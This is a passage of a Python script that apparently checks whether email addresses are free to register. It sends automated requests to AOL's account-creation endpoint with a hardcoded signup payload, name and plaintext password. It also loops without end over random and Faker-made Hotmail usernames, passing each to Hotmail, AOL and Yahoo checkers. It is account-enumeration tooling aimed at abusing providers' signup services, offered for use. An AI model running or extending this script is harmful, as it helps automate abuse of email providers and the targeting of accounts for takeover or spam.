frhmGNHDau2p%2BMM6H1BmWa8dHcPV%2FoPSypCfsbOlR6ighcU2LH0girazVn%2FjC3h6Wa9kSUWD3CFbmxAGRiQRc%2B1Vy6JpN31nPaidUsfdPPkhT7fjNGI0tBc9JuinetQEIYMQQoChHAs88jeWnvDRWhXP5kUq3b4hZIAiZMbJYtaxCc8bjntfz7fSG3tapU%2BbAHTOIH%2FcZj%2FCNuyLy22ksHLiD17K7qn6UvNzfihwqLmfKLjr0lSmsxSQM9bq%2Fz%2FtN3R%2BU37HibIwdgFIqJv39aFDN7zfx2D1gHCwHOVLuqPV8hyd3NGy%2BdSMgJI0nRc3zudIxeoYfd1n3rH8ydGLcOfDOPmmpr6JAYb11TXaVHdST3qHGImSNVKxym5km368faI9Xfa%2BdsSQM5AE3bAQSJELKJb0LHFW3giXIyjy7f38MvKdgASUj%2FfleP91pOZ7%2B6TxYi0hj%2B6adP2KNLgDnnNHm2rJvr1m8rgEdyUacH0RnEhqqmLa3p%2Fi0GOojXMcw0XmEGjACGZXEr84e88DgQ6%2B3SAtW9f4epdxHvvcFFTUGBdRz1R0oansSGb%2B%2FjN%2F4L%2BzVLpTVpVHUg8PaDHvrG%2BsBVpRlnnSDm64oJrsLcsmoN2RIRQK4OCP11hGRxkkOPZvYegLIpS0OLGCoQi6g5nwc%2Bx1XL3N6y%2BYnU%2FhVRAH0vLrf%7C66vwD2bU9Gs3z4hwydc2rw%3D%3D%7CXNNl29p5jUEcATw3m%2B5Bpw%3D%3D&tos0=oath_freereg%7Cus%7Cen-US&multiDomain=&firstName=Ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006%23%23%25%24&mm=7&dd=2&yyyy=2000&signup=&signup='

    rr = requests.post('https://login.aol.com/account/module/create', params=params, cookies=cookies, headers=headers, data=data).text
    if '{"errors":[]}' in rr:
        print(f'{C}Good AOL >> {name}@aol.com')
        email = name + '@aol.com'
        serverAol(email)
    else:
        print(f'{Z}Bad Gmail >> {name}@aol.com')
        
def searchHot():
    faker = Faker('ru_RU')
    while True:
        users = faker.user_name()
        num = '56789'
        rng = int("".join(random.choice(num) for i in range(1)))
        wqq = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
        name = str("".join(random.choice(wqq) for i in range(rng)))
        bosses = [name , users]
        boss = random.choice(bosses)
        email = boss + '@hotmail.com'
        Chotm(email)       
        chAol(email)
        chYahoo(email)
        
if __name__ == "__main__":
    searchHot()
    